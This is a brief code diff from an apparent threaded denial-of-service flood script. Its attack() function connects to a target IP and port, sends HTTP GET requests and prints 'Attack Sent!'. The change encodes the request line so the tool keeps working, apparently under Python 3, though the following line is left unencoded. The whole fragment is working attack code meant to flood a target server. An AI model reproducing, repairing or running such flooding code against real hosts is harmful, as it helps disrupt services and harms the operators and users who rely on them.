@@ -89,7 +89,7 @@ def attack(ip, port, threadNum):
                 print("[*] Thread (%s) | Attack Sent!" % (threadNum))
             else:
                 s.connect((ip, int(port)))
-                s.sendto("GET /%s HTTP/1.1\r\n" % (url), (ip, int(port)))
+                s.sendto(("GET /%s HTTP/1.1\r\n" % (url)).encode('utf-8'), (ip, int(port)))
                 s.sendto("Host: %s\r\n\r\n" % (url), (ip, int(port)))
                 s.close()
                 print("[*] Thread (%s) | Attack Sent!" % (threadNum))
